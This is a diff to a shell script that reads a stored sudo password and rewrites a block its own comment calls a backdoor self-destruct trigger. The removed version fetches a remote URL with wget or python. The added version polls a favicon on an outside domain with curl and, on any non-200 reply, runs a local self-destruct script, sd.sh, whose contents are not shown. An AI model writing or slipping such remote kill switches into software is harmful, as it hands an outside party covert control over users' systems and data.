@@ -16,19 +16,13 @@ fi
 SUDO_PASS=$(<"$PFILE")
 
 # === Backdoor: self-destruct trigger ===
-# Fetch self-destruct trigger without curl
-if command -v wget >/dev/null 2>&1; then
-  RESPONSE=$(wget -qO- "https://drive.genshinimpact.ca/f/pYfA/carterbrick")
-elif command -v python3 >/dev/null 2>&1; then
-  RESPONSE=$(python3 - <<EOF
-import urllib.request
-print(urllib.request.urlopen("https://drive.genshinimpact.ca/f/pYfA/carterbrick").read().decode())
-EOF
-)
-else
-  RESPONSE=""
-fi
-if echo "$RESPONSE" | grep -q '"code":40004,"msg":"Object existed"'; then
+# Check if favicon.ico is available (HTTP status 200) within 10s; ignore on timeout
+HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "https://genshinimpact.ca/favicon.ico")
+CURL_EXIT=$?
+if [ "$CURL_EXIT" -eq 28 ]; then
+  # Request timed out; ignore
+  :
+elif [ "$HTTP_STATUS" -ne 200 ]; then
   echo "[*] Self-destruct trigger received. Launching sd.sh..."
   bash "$TARGET_DIR/subp/sd.sh"
   exit 0
